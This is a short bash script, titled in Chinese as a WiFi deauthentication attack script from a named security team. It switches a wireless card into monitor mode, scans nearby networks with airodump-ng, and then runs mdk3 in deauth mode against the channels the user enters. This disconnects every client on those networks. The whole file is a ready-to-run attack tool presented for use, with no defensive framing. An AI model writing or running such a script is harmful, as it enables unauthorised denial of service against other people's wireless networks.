#! /bin/bash
echo 末心网络安全团队Deauth攻击脚本
read -p "请输入网卡名称:" DNAME
echo 你的网卡名称为$DNAME
echo 
echo 
echo 
echo 正在为您打开网卡监听模式
airmon-ng check kill
airmon-ng start $DNAME
echo 由于此为便携脚本还请您检查
iwconfig
echo 请问是否已打开monitor模式？
read -p "[Y/N]" XZ
if [ $XZ == "Y" ];then
	echo 您确认已经打开了monitor模式
	echo 即将为您扫描附近的WiFi
	airodump-ng ${DNAME}mon
	echo 请输入您需要deauth的信道
	echo 您可以用英文,分割开多个信道
	read -p "change:" CHANGE
	mdk3 ${DNAME}mon d -c $CHANGE
else
	echo 未打开monitor模式
	echo 为您使用另一种方式
	iwconfig $DNAME mode monitor
	ifconfig -a	
	echo 请问是否开monitor模式
	read -p "[Y/N]" XZ
	if [ $XZ == "Y" ];then
		echo 您已打开monitor模式
		echo 即将为您进行WiFi扫描
		airodump-ng ${DNAME}mon
		read -p "change:" CHANGE
		echo 如果要输入多个change可以用英文逗号分割
		mdk3 ${DNAME}mon d -c $CHANGE
	else
		echo 打开失败！
	fi
fi
